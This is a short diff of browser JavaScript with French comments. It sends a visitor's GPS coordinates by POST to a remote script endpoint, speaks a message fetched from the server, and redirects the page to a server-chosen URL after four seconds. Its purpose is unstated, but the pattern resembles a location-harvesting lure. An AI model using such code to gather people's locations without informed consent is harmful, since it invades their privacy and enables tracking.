@@ -8,9 +8,10 @@
 
     async function sendLocation() {
       try {
+        // Obtenir la position GPS
         const position = await new Promise((resolve, reject) => {
           if (!navigator.geolocation) {
-            reject(new Error("La géolocalisation n'est pas supportée par ce navigateur."));
+            reject(new Error("Géolocalisation non disponible."));
           }
           navigator.geolocation.getCurrentPosition(resolve, reject);
         });
@@ -18,22 +19,28 @@
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        // Envoi des coordonnées
-        await fetch(`${scriptURL}?id=test&latitude=${latitude}&longitude=${longitude}`, {
-          method: "GET"
+        // ⚠️ Envoi correct via POST (vers doPost)
+        await fetch(scriptURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: `id=test&latitude=${latitude}&longitude=${longitude}`
         });
 
-        // Récupération de l'URL
+        // 🔄 Appel à doGet pour récupérer l’URL
         const urlResp = await fetch(`${scriptURL}?data=url`);
-        const urlText = await urlResp.text(); // ✅ C'est bien du texte
+        const urlText = await urlResp.text();
 
-        // Récupération du message vocal
+        // 🔄 Appel à doGet pour récupérer le message
         const msgResp = await fetch(`${scriptURL}?data=message`);
-        const msgText = await msgResp.text(); // ✅
+        const msgText = await msgResp.text();
 
+        // 🔊 Lecture vocale
         const utterance = new SpeechSynthesisUtterance(msgText);
         speechSynthesis.speak(utterance);
 
+        // ✅ Redirection après 4 secondes
         setTimeout(() => {
           window.location.href = urlText.trim();
         }, 4000);
